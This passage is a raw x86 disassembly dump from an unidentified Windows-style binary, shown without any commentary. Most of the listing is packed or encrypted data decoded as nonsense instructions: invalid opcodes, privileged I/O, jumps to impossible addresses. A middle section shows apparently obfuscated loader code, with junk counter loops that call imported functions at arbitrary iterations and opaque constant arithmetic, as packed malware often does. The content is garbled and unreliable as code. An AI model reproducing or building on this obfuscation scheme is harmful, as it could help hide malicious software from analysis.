  40305e:	rcl    DWORD PTR [ebx-0x1],0x44
  403062:	and    DWORD PTR [ebx-0x88152e1],esi
  403068:	sbb    eax,0xd5479a15
  40306d:	xchg   edx,eax
  40306e:	pop    ecx
  40306f:	jne    0x403053
  403071:	lock adc ebp,DWORD PTR [edi]
  403074:	ins    BYTE PTR es:[edi],dx
  403075:	mov    bh,0xdc
  403077:	sti    
  403078:	sti    
  403079:	loop   0x403042
  40307b:	mov    ecx,0x9c7dd479
  403080:	push   eax
  403081:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403082:	(bad)  
  403084:	sub    BYTE PTR [ecx+0x3a0a8fed],bh
  40308a:	aam    0xfd
  40308c:	pop    edx
  40308d:	push   eax
  40308e:	adc    edi,DWORD PTR [ebx]
  403090:	push   edi
  403091:	idiv   DWORD PTR [ebx]
  403093:	ud2    
  403095:	test   BYTE PTR [eax+0x6c9fe48b],0x63
  40309c:	inc    ebx
  40309d:	(bad)  
  40309f:	movups xmm5,xmm7
  4030a2:	es xor eax,0x1b1cb133
  4030a8:	pop    ebx
  4030a9:	out    dx,al
  4030aa:	sbb    eax,0xe6fef907
  4030af:	jo     0x403078
  4030b1:	clc    
  4030b2:	mov    bh,0x7e
  4030b4:	mov    ah,0x2b
  4030b6:	pusha  
  4030b7:	or     bh,bh
  4030b9:	ins    DWORD PTR es:[edi],dx
  4030ba:	cmp    BYTE PTR [esi],al
  4030bc:	add    dl,BYTE PTR [ebx+0x43]
  4030bf:	ds addr16 jmp 0x40309a
  4030c3:	popf   
  4030c4:	and    edx,ebp
  4030c6:	jmp    0x4030fa
  4030c8:	xor    ah,BYTE PTR [ecx-0x20]
  4030cb:	mov    ecx,DWORD PTR [edx-0x71]
  4030ce:	or     BYTE PTR [esi-0x1a],0x72
  4030d2:	mov    esp,0x551214b1
  4030d7:	bound  ecx,QWORD PTR [edi]
  4030d9:	aad    0x95
  4030db:	daa    
  4030dc:	in     al,dx
  4030dd:	inc    ebp
  4030de:	cmp    dl,al
  4030e0:	mov    esi,?
  4030e2:	xchg   ecx,eax
  4030e3:	je     0x40310f
  4030e5:	jno    0x4030cb
  4030e7:	hlt    
  4030e8:	fld    QWORD PTR [edx]
  4030ea:	lods   eax,DWORD PTR ds:[esi]
  4030eb:	fldenv [esi+0x39a1335a]
  4030f1:	imul   esp,DWORD PTR [ecx-0x20b1d507],0x41
  4030f8:	ins    DWORD PTR es:[edi],dx
  4030f9:	inc    esi
  4030fa:	aas    
  4030fb:	adc    ecx,edx
  4030fd:	mov    ch,0x92
  4030ff:	push   edi
  403100:	cmp    BYTE PTR [edi-0x2a],dh
  403103:	add    ebp,DWORD PTR [edi-0x7e]
  403106:	repz jp 0x403113
  403109:	shl    DWORD PTR [ecx],0x81
  40310c:	fdivr  QWORD PTR [ebx-0x4b539aae]
  403112:	daa    
  403113:	mov    ss,WORD PTR [edx+0x1c]
  403116:	or     eax,0x4cb946bf
  40311b:	das    
  40311c:	inc    ebp
  40311d:	push   0xffd72084
  403122:	sbb    dh,BYTE PTR ds:0x94736ee4
  403128:	in     eax,dx
  403129:	daa    
  40312a:	mov    ebp,0x5b907451
  40312f:	ficomp DWORD PTR [edx+edi*4-0x61]
  403133:	in     al,0x3a
  403135:	jmp    0x65b669a3
  40313a:	loope  0x403191
  40313c:	call   DWORD PTR [eax-0x2]
  40313f:	mov    eax,DWORD PTR [ebp-0x38]
  403142:	mov    ecx,DWORD PTR ds:0x413bb0
  403148:	add    DWORD PTR [eax],ecx
  40314a:	pop    edi
  40314b:	jmp    0x4032ec
  403150:	add    dl,BYTE PTR [ecx]
  403152:	mov    BYTE PTR [ebx-0x4ede4c77],ch
  403158:	adc    BYTE PTR [edx-0xf773ea4],0xce
  40315f:	mov    BYTE PTR [edx-0x58181e9],bh
  403165:	jg     0x4031e5
  403167:	jle    0x403162
  403169:	cmp    eax,0xcd7e74b6
  40316e:	adc    ebx,ecx
  403170:	xchg   esp,eax
  403171:	fist   DWORD PTR [ebx+0x4d852fc5]
  403177:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403178:	pop    ds
  403179:	iret   
  40317a:	fwait
  40317b:	sar    eax,1
  40317d:	ins    BYTE PTR es:[edi],dx
  40317e:	fs pop edx
  403180:	shl    BYTE PTR [ebx-0x2fee65d0],1
  403186:	mov    dl,al
  403188:	dec    ecx
  403189:	rcl    eax,1
  40318b:	push   cs
  40318c:	scas   al,BYTE PTR es:[edi]
  40318d:	push   esi
  40318e:	ins    DWORD PTR es:[edi],dx
  40318f:	fstp   TBYTE PTR [eax+0x75122e85]
  403195:	mov    dl,0xa8
  403197:	(bad)  
  403198:	fcmovnb st,st(6)
  40319a:	and    esi,0xfffffffa
  40319d:	ret    0x234b
  4031a0:	cs inc esi
  4031a2:	ret    
  4031a3:	xchg   esp,eax
  4031a4:	mov    ch,0xc0
  4031a6:	scas   al,BYTE PTR es:[edi]
  4031a7:	cmp    edx,DWORD PTR [esi+edi*8-0x68]
  4031ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031ac:	mov    al,0x4f
  4031ae:	test   al,0xaa
  4031b0:	(bad)  
  4031b1:	aam    0x71
  4031b3:	jno    0x40314e
  4031b5:	(bad)  
  4031b6:	(bad)  
  4031b7:	ds in  al,0x85
  4031ba:	sbb    dh,BYTE PTR [edi-0x12]
  4031bd:	mov    cl,0x51
  4031bf:	lds    edi,FWORD PTR [edi-0x2f]
  4031c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031c3:	mov    DWORD PTR [eax-0x749afced],ecx
  4031c9:	dec    edi
  4031ca:	jae    0x4031f3
  4031cc:	lock mov ds:0xb7af69ab,eax
  4031d2:	sub    edx,DWORD PTR [eax+edx*2+0x76]
  4031d6:	jecxz  0x403203
  4031d8:	rcl    DWORD PTR [esp+edi*8],1
  4031db:	retf   0x4de
  4031de:	ins    BYTE PTR es:[edi],dx
  4031df:	aaa    
  4031e0:	mov    dh,0x3a
  4031e2:	pushf  
  4031e3:	das    
  4031e4:	dec    edx
  4031e5:	clc    
  4031e6:	and    esp,DWORD PTR [edx]
  4031e8:	jns    0x4031a3
  4031ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031eb:	ror    DWORD PTR [eax],0xe3
  4031ee:	les    ebx,FWORD PTR [eax+0x6900e07a]
  4031f4:	lods   eax,DWORD PTR ds:[esi]
  4031f5:	lock stos DWORD PTR es:[edi],eax
  4031f7:	push   ecx
  4031f8:	es sti 
  4031fa:	push   ss
  4031fb:	fldenv [eax-0x45c1d12d]
  403201:	inc    ebp
  403202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403203:	loopne 0x403262
  403205:	xchg   ecx,eax
  403206:	push   esp
  403207:	mov    ds:0x9f997914,eax
  40320c:	call   0x8072:0x6990c092
  403213:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403214:	dec    edi
  403215:	cdq    
  403216:	jbe    0x4031d0
  403218:	pop    edi
  403219:	cs mov al,0x6a
  40321c:	mov    eax,0x6ea8fee4
  403221:	jbe    0x40328e
  403223:	sti    
  403224:	mov    dl,bh
  403226:	mov    bh,0x4f
  403228:	ja     0x403246
  40322a:	and    DWORD PTR [ecx],esi
  40322c:	sbb    BYTE PTR es:[esi],0x92
  403230:	mov    eax,ds:0x8e085d3c
  403235:	je     0x81852819
  40323b:	jl     0x403258
  40323d:	enter  0xf216,0xae
  403241:	ficom  DWORD PTR [esi]
  403243:	dec    ecx
  403244:	lock dec esp
  403246:	sub    cl,BYTE PTR [esi-0x8]
  403249:	pop    ecx
  40324a:	xchg   BYTE PTR [edx+0x8],ch
  40324d:	cwde   
  40324e:	test   al,0xe
  403250:	or     ah,dl
  403252:	bound  ebx,QWORD PTR [eax+0x3bd12af9]
  403258:	cli    
  403259:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40325a:	or     ah,BYTE PTR [ebx+0x5b64f4c0]
  403260:	inc    edi
  403261:	ror    BYTE PTR [ebx+0x3f],cl
  403264:	in     al,0x44
  403266:	or     eax,0x3c9e9ba6
  40326b:	mov    fs,ebx
  40326d:	xor    BYTE PTR [ebx+0x1d7e5d03],0xb0
  403274:	push   0xf10c8965
  403279:	stos   DWORD PTR es:[edi],eax
  40327a:	cs cmp bl,dh
  40327d:	cmp    DWORD PTR [esi],0x113e74a1
  403283:	addr16 cld 
  403285:	mov    WORD PTR [edx],es
  403287:	les    edx,FWORD PTR [ebp+0x47]
  40328a:	push   ebx
  40328b:	sub    eax,0xe25703f3
  403290:	adc    al,0xb2
  403292:	or     ebp,DWORD PTR [ecx]
  403294:	jnp    0x403253
  403296:	push   ecx
  403297:	cmp    bl,BYTE PTR [edi]
  403299:	loope  0x4032f4
  40329b:	repnz pop ebx
  40329d:	test   al,0x59
  40329f:	pop    ss
  4032a0:	shl    DWORD PTR [ebx+0x30],1
  4032a3:	jo     0x4032a2
  4032a5:	loop   0x40328d
  4032a7:	fcmovu st,st(5)
  4032a9:	or     dh,al
  4032ab:	nop
  4032ac:	dec    ebx
  4032ad:	inc    ebp
  4032ae:	test   BYTE PTR [edx+edi*1+0x36],dh
  4032b2:	add    cl,dl
  4032b4:	adc    ebx,DWORD PTR [eax-0x4e]
  4032b7:	push   ebp
  4032b8:	xchg   esp,eax
  4032b9:	cli    
  4032ba:	int    0x3d
  4032bc:	pushf  
  4032bd:	lods   al,BYTE PTR ds:[esi]
  4032be:	dec    esp
  4032bf:	pop    esp
  4032c0:	(bad)  ds:0xc248b1f6
  4032c6:	or     edi,ebp
  4032c8:	mov    ecx,0x4ff4205f
  4032cd:	xor    DWORD PTR [esi],esi
  4032cf:	add    bl,0x51
  4032d2:	xor    al,0x40
  4032d4:	mov    dl,0x25
  4032d6:	popa   
  4032d7:	adc    al,0x32
  4032d9:	out    0x13,al
  4032db:	dec    edx
  4032dc:	mov    ebp,0x46ff1985
  4032e1:	les    esi,FWORD PTR [edx+0x6]
  4032e4:	jg     0x40328c
  4032e6:	lahf   
  4032e7:	out    dx,al
  4032e8:	fs call 0x5b9f27ae
  4032ee:	leave  
  4032ef:	ret    
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x4336db,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x4336db
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x4336db,ecx
  40331d:	cmp    DWORD PTR ds:0x4336db,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x4336db,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x43376f,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x433757,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43369f
  40336b:	add    DWORD PTR ds:0x433683,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x4336d7,0x1e
  40338b:	cmp    DWORD PTR ds:0x4336d7,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x4336d7,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x4336d7,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x4336d7
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x4336d7,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x4336d7
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x4336d7,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x433767
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x4336c7
  4033f2:	mov    edi,DWORD PTR ds:0x433707
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x4336e7,0x1c
  40340f:	cmp    DWORD PTR ds:0x4336e7,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x4336e7,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x4336e7,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x4336e7
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x4336e7,edi
  40344c:	mov    edi,DWORD PTR ds:0x4336e7
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x4336e7,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x433763
  403467:	and    edx,DWORD PTR ds:0x433797
  40346d:	mov    DWORD PTR ds:0x433763,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43371b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43379f
  40349f:	adc    DWORD PTR ds:0x43367f,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433797,0x10
  4034c6:	cmp    DWORD PTR ds:0x433797,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433797,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433797,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433797
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433797,edi
  403505:	mov    edi,DWORD PTR ds:0x433797
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433797,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x4337ab,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp+0x5580d48a]
  403537:	mov    ?,WORD PTR [eax-0x3a]
  40353a:	adc    eax,0x7c587e7e
  40353f:	jle    0x4035bf
  403541:	xchg   ebx,eax
  403542:	sub    BYTE PTR [esi+0x5b2739bc],ah
  403548:	push   edx
  403549:	and    DWORD PTR [edx+0x6e],edi
  40354c:	mov    ah,0x19
  40354e:	shr    BYTE PTR [ecx+edx*4],1
  403551:	xor    al,0xe6
  403553:	or     bh,BYTE PTR [esi]
  403555:	pop    esp
  403556:	mov    cl,0xe8
  403558:	loop   0x403549
  40355a:	mov    eax,ds:0xfe1f14a6
  40355f:	adc    ch,BYTE PTR [edi+eiz*4-0xdfd0854]
  403566:	bound  edi,QWORD PTR [esi-0x307dcaa]
  40356c:	jo     0x403580
  40356e:	add    DWORD PTR ds:0x93ffebd7,ebp
  403574:	xor    eax,0x7f75a583
  403579:	mov    WORD PTR [ebp+0x35],fs
  40357c:	into   
  40357d:	sub    al,0xad
  40357f:	lea    edi,[edx-0x9]
  403582:	add    edx,DWORD PTR [edx]
  403584:	jmp    0x403554
  403586:	cmp    al,0x6b
  403588:	js     0x403533
  40358a:	popf   
  40358b:	xchg   BYTE PTR [ebp-0x2e],ch
  40358e:	imul   esp,DWORD PTR [edx+0x4a9f6231],0x7a82b601
  403598:	neg    BYTE PTR [ebx+0x3]
  40359b:	iret   
  40359c:	jp     0x4035fc
  40359e:	out    dx,al
  40359f:	mov    al,ds:0x47e261f3
  4035a4:	mov    edx,edx
  4035a6:	inc    ebx
  4035a7:	je     0x403559
  4035a9:	dec    edx
  4035aa:	jmp    0x46c70570
  4035af:	jmp    0xcbdc30a3
  4035b4:	xchg   ecx,eax
  4035b5:	mov    eax,0x47e55b96
  4035ba:	sub    ecx,edx
  4035bc:	ror    BYTE PTR [edi-0x1],cl
  4035bf:	retf   
  4035c0:	(bad)  
  4035c1:	adc    eax,0x23b976c9
  4035c6:	jmp    0x1a8f5eb9
  4035cb:	(bad)  
  4035cc:	int    0x3d
  4035ce:	cmc    
  4035cf:	out    0x81,eax
  4035d1:	add    DWORD PTR [edx-0x7b6644a0],edx
  4035d7:	mov    ecx,0x349bd28b
  4035dc:	xchg   ah,dl
  4035de:	dec    ebp
  4035df:	mov    bl,0x7c
  4035e1:	pushf  
  4035e2:	inc    esi
  4035e3:	push   0x66
  4035e5:	mov    esp,0xb54a108f
  4035ea:	adc    eax,0x4c552673
  4035ef:	lods   al,BYTE PTR ds:[esi]
  4035f0:	mov    ebp,0x2a318232
  4035f5:	add    al,0x27
  4035f7:	mov    ebx,0xf317297b
  4035fc:	cmp    edi,esp
  4035fe:	xchg   edi,eax
  4035ff:	shl    ch,cl
  403601:	test   eax,0x878e561e
  403606:	ins    BYTE PTR es:[edi],dx
  403607:	push   edi
  403608:	repz xor ch,BYTE PTR [eax-0x301973ec]
  40360f:	and    eax,0xc726e0bb
  403614:	xchg   esi,eax
  403615:	and    ecx,DWORD PTR [ecx+edx*1]
  403618:	dec    ecx
  403619:	std    
  40361a:	dec    esp
  40361b:	mov    dl,0x1a
  40361d:	addr16 (bad) 
  40361f:	icebp  
  403620:	dec    esi
  403621:	push   edx
  403622:	bound  edi,QWORD PTR [edi+eiz*1]
  403625:	dec    esp
  403626:	push   ds
  403627:	repnz frstor ds:0xa6543a62
  40362e:	mov    ch,0xd
  403630:	dec    ebp
  403631:	cmp    cl,BYTE PTR [eax]
  403633:	add    BYTE PTR [eax],cl
  403635:	loop   0x4035e4
  403637:	into   
  403638:	and    eax,0xcdc238e8
  40363d:	iret   
  40363e:	add    BYTE PTR [edi+0x79],dl
  403641:	cmc    
  403642:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403643:	std    
  403644:	retf   0xd881
  403647:	jb     0x4035cc
  403649:	fcom   DWORD PTR [edi]
  40364b:	inc    edx
  40364c:	ss or  eax,ebp
  40364f:	not    BYTE PTR [edi-0x77b9a3cc]
  403655:	outs   dx,DWORD PTR ds:[esi]
  403656:	mov    al,ds:0x1b434da5
  40365b:	imul   BYTE PTR [eax]
  40365d:	test   al,0x3
  40365f:	lahf   
  403660:	mov    esi,0xbdc994a
  403665:	lods   al,BYTE PTR ds:[esi]
  403666:	ret    
  403667:	push   edx
  403668:	lock jne 0x403674
  40366b:	pusha  
  40366c:	ret    
  40366d:	enter  0x8e1f,0x8e
  403671:	adc    al,0x95
  403673:	pop    ds
  403674:	scas   al,BYTE PTR es:[edi]
  403675:	mov    WORD PTR [edi+0x7f463711],?
  40367b:	mov    edi,0xe169352a
  403680:	(bad)  
  403681:	aam    0x3c
  403683:	xor    BYTE PTR [esi+0x15],ch
  403686:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403687:	mul    DWORD PTR [ebx+0x34]
  40368a:	stos   DWORD PTR es:[edi],eax
  40368b:	cmc    
  40368c:	xor    al,0x23
  40368e:	xor    BYTE PTR [ebp-0x17],al
  403691:	mov    dh,0xee
  403693:	shl    BYTE PTR [edi-0x22543cc3],1
  403699:	in     eax,dx
  40369a:	xor    DWORD PTR [edx-0xd],0xb3b99b2b
  4036a1:	mov    edx,0xd56be9dd
  4036a6:	adc    al,dl
  4036a8:	push   ecx
  4036a9:	mov    ch,0x97
  4036ab:	cmp    DWORD PTR [eax+0x5d],ebx
  4036ae:	fs mov ah,0x7e
  4036b1:	test   BYTE PTR [ebx+0x3b4ea934],dl
  4036b7:	std    
  4036b8:	in     eax,dx
  4036b9:	stos   DWORD PTR es:[edi],eax
  4036ba:	and    DWORD PTR [esi-0x1c],ebx
  4036bd:	lods   al,BYTE PTR fs:[esi]
  4036bf:	call   0x26f8dfe5
  4036c4:	test   DWORD PTR [ecx+0x77b1408],eax
  4036ca:	dec    ebp
  4036cb:	js     0x40367f
  4036cd:	sub    ch,BYTE PTR [ebp-0x402ca87d]
  4036d3:	lock cmp al,BYTE PTR [eax]
  4036d6:	jb     0x4036b2
  4036d8:	into   
  4036d9:	nop
  4036da:	xor    ebx,esi
  4036dc:	pop    esi
  4036dd:	push   edx
  4036de:	pop    ebx
  4036df:	xchg   edx,eax
  4036e0:	call   0xebf90786
  4036e5:	pop    ecx
  4036e6:	xor    edi,ebp
  4036e8:	cmp    edx,DWORD PTR [edi-0xb]
  4036eb:	add    DWORD PTR [ecx],ebp
  4036ed:	vpmulhuw xmm0,xmm5,XMMWORD PTR ds:0x939f70cd
  4036f5:	cmp    ebx,DWORD PTR [ecx]
  4036f7:	fstp   TBYTE PTR [edi+0x7a]
  4036fa:	stos   BYTE PTR es:[edi],al
  4036fb:	sub    DWORD PTR [esi],0xedd6ec60
  403701:	popa   
  403702:	fdiv   DWORD PTR [edx-0x2]
  403705:	pop    ebx
  403706:	cmp    cl,dl
  403708:	add    al,BYTE PTR [ebp-0x33a82957]
  40370e:	dec    esp
  40370f:	fisub  WORD PTR [edi+ebx*2+0x16]
  403713:	leave  
  403714:	iret   
  403715:	mov    ds:0x49aa51bc,al
  40371a:	ret    
  40371b:	pop    ebp
  40371c:	mov    al,0xb5
  40371e:	ffreep st(6)
  403720:	lahf   
  403721:	aad    0xfd
  403723:	jmp    0x403745
  403725:	addr16 loope 0x40377f
  403728:	adc    edx,DWORD PTR [edi-0x7a]
  40372b:	rep stos BYTE PTR es:[edi],al
  40372d:	or     eax,0xde50e08d
  403732:	dec    edi
  403733:	out    0x66,eax
  403735:	mov    eax,0x73100be5
  40373a:	push   eax
  40373b:	jl     0x4036d7
  40373d:	int    0xaf
  40373f:	add    DWORD PTR [ebx],ecx
  403741:	mov    edx,0x126ca6f0
  403746:	xchg   ebp,eax
  403747:	mov    ebx,0x1e995fa0
  40374c:	repz cmp edx,DWORD PTR [esi+0x4217295]
  403753:	retf   
  403754:	fst    DWORD PTR [ebx]
  403756:	jae    0x403739
  403758:	(bad)  
  403759:	sbb    ch,BYTE PTR [edx]
  40375b:	pusha  
  40375c:	retf   
  40375d:	dec    ecx
  40375e:	mov    al,ds:0x23adf890
  403763:	call   0xc99f8132
  403768:	stos   DWORD PTR es:[edi],eax
  403769:	sbb    DWORD PTR [edx],0xfb8c3080
  40376f:	xchg   esp,eax
  403770:	add    esp,DWORD PTR [esp+edx*1]
  403773:	mov    ch,0xb9
  403775:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403776:	pop    ss
  403777:	sbb    eax,0xa3ffeae5
  40377c:	rcl    BYTE PTR [eax-0x532df69d],0x86
  403783:	ins    BYTE PTR es:[edi],dx
  403784:	cmp    BYTE PTR [eax+ebx*2+0x54],dh
  403788:	jmp    0xef3:0xac38f70d
  40378f:	call   0xf0b03c67
  403794:	jae    0x403757
  403796:	sbb    al,0xc
  403798:	call   0x9e507c8b
  40379d:	stc    
  40379e:	mov    ebx,0x6cb2aa54
  4037a3:	and    al,0x60
  4037a5:	cs scas eax,DWORD PTR es:[edi]
  4037a7:	mov    ebx,0x65bb5829
  4037ac:	mov    esi,0xac2079
  4037b1:	leave  
  4037b2:	lds    edx,FWORD PTR ds:0x33a1676d
  4037b8:	mov    eax,0xe3cdbe33
  4037bd:	(bad)  
  4037be:	mov    dl,ah
  4037c0:	pop    ebp
  4037c1:	xchg   edi,eax
  4037c2:	daa    
  4037c3:	ret    
  4037c4:	jecxz  0x403777
  4037c6:	aaa    
  4037c7:	sahf   
  4037c8:	lods   eax,DWORD PTR ds:[esi]
  4037c9:	popf   
  4037ca:	pop    ecx
  4037cb:	mov    ecx,0x16a4f097
  4037d0:	or     WORD PTR ds:0x5776c867,ax
  4037d7:	pop    esi
  4037d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037d9:	in     al,0xe6
  4037db:	sub    BYTE PTR [eax],dl
  4037dd:	ret    0xfc7f
  4037e0:	fsub   st(7),st
  4037e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037e3:	jns    0x403834
  4037e5:	ja     0x4037e6
  4037e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037e8:	das    
  4037e9:	xor    eax,0xc9bb46f7
  4037ee:	sub    dl,BYTE PTR [esi]
  4037f0:	pop    ebx
  4037f1:	dec    ecx
  4037f2:	push   ebx
  4037f3:	sub    al,BYTE PTR [eax-0x5316bcf2]
  4037f9:	fadd   QWORD PTR [edx+0x36]
  4037fc:	or     ecx,DWORD PTR [ecx+0x50]
  4037ff:	xchg   ecx,eax
  403800:	xor    BYTE PTR [esi+0x1855e86f],ch
  403806:	mov    ds:0xb87f384f,al
  40380b:	adc    eax,DWORD PTR [edi]
  40380d:	ret    0x7ba3
  403810:	into   
  403811:	das    
  403812:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  403814:	or     BYTE PTR [ebx+edi*8+0x3b898ead],dh
  40381b:	pxor   mm5,QWORD PTR ds:[edx+ecx*4]
  403820:	sub    bl,BYTE PTR [eax]
  403822:	mov    WORD PTR [edx+esi*2-0x68],ds
  403826:	imul   eax,edi,0x8538c445
  40382c:	pushf  
  40382d:	clc    
  40382e:	sbb    edi,DWORD PTR ds:0x43367b
  403834:	mov    edx,DWORD PTR [ebp+0x8]
  403837:	sbb    edi,DWORD PTR ds:0x43372b
  40383d:	xor    edx,eax
  40383f:	and    DWORD PTR ds:0x4337a7,0x0
  403849:	xor    edi,edi
  40384b:	add    edi,DWORD PTR ds:0x4337a7
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x4337a7,edi
  403858:	cmp    DWORD PTR ds:0x4337a7,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x4337a7,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x4337a7
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x4337a7,edi
  40389c:	cmp    DWORD PTR ds:0x4337a7,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x4336eb,0x4337ab
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433713,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x43376b,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x4337a7,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x43376b,0x43372b
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x43367b,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433697,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433693,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43379b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x43367f,0x1d
  403935:	cmp    DWORD PTR ds:0x43367f,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x43367f,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x43367f,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x43367f
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x43367f,ebx
  403985:	mov    ebx,DWORD PTR ds:0x43367f
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x43367f,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x4336e7
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433693
  4039a6:	sub    edi,DWORD PTR ds:0x4337a3
